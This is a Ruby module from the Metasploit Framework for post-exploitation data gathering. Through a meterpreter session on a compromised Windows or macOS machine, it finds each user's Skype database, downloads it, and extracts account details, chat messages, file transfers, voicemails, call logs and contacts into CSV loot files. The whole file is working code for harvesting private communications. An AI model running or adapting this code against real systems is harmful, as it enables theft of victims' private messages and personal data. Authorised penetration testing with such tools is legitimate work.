##
# $Id$
##

##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'csv'

require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/windows/user_profiles'

require 'msf/core/post/osx/system'



class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Post::Windows::UserProfiles
	
	include Msf::Post::OSX::System

	
	
	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Multi Gather Skype User Data Enumeration',
				'Description'   => %q{
					This module will enumerate the Skype accounts settings, contact list, call history, chat logs,
					file transfer history and voicemail log saving all the data in to CSV files for analysis.
				},
				'License'       => MSF_LICENSE,
				'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
				'Version'       => '$Revision$',
				'Platform'      => [ 'windows', 'osx' ],
				'SessionTypes'  => [ 'meterpreter' ]
			))
	end

	# Run Method for when run command is issued
	def run
		# syinfo is only on meterpreter sessions
		print_status("Running module for Skype enumeration against #{sysinfo['Computer']}") if not sysinfo.nil?
		
		# Ensure that SQLite3 gem is installed
		begin
			require 'sqlite3'
		rescue LoadError
			print_error("SQLite3 is not available, and we are not able to parse the database.")
			return
		end

		if sysinfo['OS']=~ /Mac OS X/
			# Iterate thru each user profile on as OSX System for users not in the default install
			users = get_nonsystem_accounts.collect {|p| if p['uid'].to_i > 500; p; end }.compact
			users.each do |p|
				if check_skype("#{p['dir']}/Library/Application Support/", p['name'])
					db_in_loot = download_db(p)
					process_db(db_in_loot,p['name'])
				end
			end
		else
			# Iterate thru each user profile in a Windows System using Meterpreter Post API
			grab_user_profiles().each do |p|
				if check_skype(p['AppData'],p['UserName'])
					db_in_loot = download_db(p)
					process_db(db_in_loot,p['UserName'])
				end
			end
		end
	end

	# Check if Skype is installed. Returns true or false.
	def check_skype(path, user)
		session.fs.dir.foreach(path) do |dir|
			if dir =~ /Skype/
				print_good("Skype account found for #{user}")
				return true
			end
		end
		print_error("Skype is not installed for #{user}")
		return false
	end

	# Download file using Meterpreter functionality and returns path in loot for the file
	def download_db(profile)
		if sysinfo['OS'] =~ /Mac OS X/
			file = session.fs.file.search("#{profile['dir']}///Library/Application Support/Skype/","main.db",true)
		else
			file = session.fs.file.search("#{profile['AppData']}\\Skype","main.db",true)
		end
		
		file_loc = store_loot("skype.config",
				"binary/db",
				session,
				"main.db",
				"Skype Configuration database for #{profile['UserName']}"
			)

		file.each do |db|
			maindb = "#{db['path']}#{session.fs.file.separator}#{db['name']}"
			print_status("Downloading #{maindb}")
			session.fs.file.download_file(file_loc,maindb)
			print_good("Configuration database saved to #{file_loc}")
		end

		return file_loc
	end

	# Saves rows returned from a query to a given CSV file
	def save_csv(data,file)
		CSV.open(file, "w") do |csvwriter|
			data.each do |record|
				csvwriter << record
			end
		end
	end
	# Extracts the data from the DB in to a CSV file
	def process_db(db_path,user)
		db = SQLite3::Database.new(db_path)

		# Extract information for accounts configured in Skype
		print_status("Enumerating accounts")
		user_rows = db.execute2('SELECT "skypeout_balance_currency", "skypeout_balance", "skypeout_precision",
					"skypein_numbers", "subscriptions", "offline_callforward", "service_provider_info",
					"registration_timestamp", "nr_of_other_instances", "partner_channel_status",
					"flamingo_xmpp_status", "owner_under_legal_age", "type", "skypename",
					"pstnnumber", "fullname", "birthday", "gender", "languages", "country",
					"province", "city", "phone_home", "phone_office", "phone_mobile", "emails",
					"homepage", "about", "profile_timestamp", "received_authrequest",
					"displayname", "refreshing", "given_authlevel", "aliases", "authreq_timestamp",
					"mood_text", "timezone", "nrof_authed_buddies", "ipcountry",
					"given_displayname", "availability", "lastonline_timestamp",
					"assigned_speeddial", "lastused_timestamp", "assigned_comment", "alertstring",
					"avatar_timestamp", "mood_timestamp", "rich_mood_text", "synced_email",
					"verified_email", "verified_company" FROM Accounts;')

		# Check if an account exists and if it does enumerate if not exit.
		if user_rows.length > 1
			user_info = store_loot("skype.accounts",
						"text/plain", session,"" ,
						"skype_accounts.csv",
						"Skype User #{user} Account information from configuration database."
					)
			print_good("Saving account information to #{user_info}")
			save_csv(user_rows,user_info)
		else
			print_error("No skype accounts are configured for #{user}")
			return
		end
	
		# Extract chat log from the database
		print_status("Extracting chat message log.")
		cl_rows = db.execute2('SELECT "chatname", "convo_id", "author", "dialog_partner",
					"timestamp", "body_xml", "remote_id" FROM "Messages" WHERE type == 61;')
		chat_log = store_loot("#skype.chat",
						"text/plain", session,"" ,
						"skype_chatlog.csv",
						"Skype User #{user} chat log from configuration database."
					)

		if cl_rows.length > 1
			print_good("Saving chat log to #{chat_log}")
			save_csv(cl_rows, chat_log)
		else
			print_error("No chat logs where found!")
		end

		# Extract file transfer history
		print_status("Extracting file transfer history")
		ft_rows = db.execute2('SELECT "partner_handle", "partner_dispname", "starttime",
					"finishtime", "filepath", "filename", "filesize", "bytestransferred", 
					"convo_id", "accepttime" FROM "Transfers";')

		file_transfer = store_loot("skype.filetransfer",
					"text/csv",
					session,
					"",
					"skype_filetransfer.csv",
					"Skype User #{user} file transfer history."
				)
		# Check that we have actual file transfers to report
		if ft_rows.length > 1
			print_good("Saving file transfer history to #{file_transfer}")
			save_csv(ft_rows, file_transfer)
		else
			print_error("No file transfer history was found!")
		end

		# Extract voicemail history
		print_status("Extracting voicemail history")
		vm_rows = db.execute2('SELECT "type", "partner_handle", "partner_dispname", "status",
					"subject", "timestamp", "duration", "allowed_duration", "playback_progress",
					"convo_id", "chatmsg_guid", "notification_id", "flags", "size", "path",
					"xmsg" FROM "Voicemails";')

		voicemail = store_loot("skype.voicemail",
					"text/csv",
					session,
					"",
					"skype_voicemail.csv",
					"Skype User #{user} voicemail history."
				)

		if vm_rows.length > 1
			print_good("Saving voicemail history to #{voicemail}")
			save_csv(vm_rows, voicemail)
		else
			print_error("No voicemail history was found!")
		end

		# Extracting call log
		print_status("Extracting call log")
		call_rows = db.execute2('SELECT "begin_timestamp", "topic","host_identity", "mike_status",
					"duration", "soundlevel", "name", "is_incoming", "is_conference", "is_on_hold",
					"start_timestamp", "quality_problems", "current_video_audience",
					"premium_video_sponsor_list", "conv_dbid" FROM "Calls";')

		call_log = store_loot("skype.callhistory",
					"text/csv",
					session,
					"",
					"skype_callhistory.csv",
					"Skype User #{user} call history."
				)
		if call_rows.length > 1
			print_good("Saving call log to #{call_log}")
			save_csv(call_rows, call_log)
		else
			print_error("No call log was found!")
		end

		# Extracting contact list
		print_status("Extracting contact list")
		ct_rows = db.execute2('SELECT  "skypename", "pstnnumber", "aliases", "fullname",
					"birthday", "languages", "country", "province", "city", "phone_home",
					"phone_office", "phone_mobile", "emails", "homepage", "about", "mood_text",
					"ipcountry", "lastonline_timestamp",  "displayname",  "given_displayname",
					"assigned_speeddial", "assigned_comment","assigned_phone1",
					"assigned_phone1_label", "assigned_phone2", "assigned_phone2_label",
					"assigned_phone3", "assigned_phone3_label", "popularity_ord", "isblocked",
					"main_phone", "phone_home_normalized", "phone_office_normalized",
					"phone_mobile_normalized", "verified_email", "verified_company"
					FROM "Contacts";')

		contact_log = store_loot("skype.contactlist",
					"text/csv",
					session,
					"",
					"skype_contactlist.csv",
					"Skype User #{user} contact list."
				)
		if ct_rows.length > 1
			print_good("Saving contact list to #{contact_log}")
			save_csv(ct_rows, contact_log)
		end
	end
end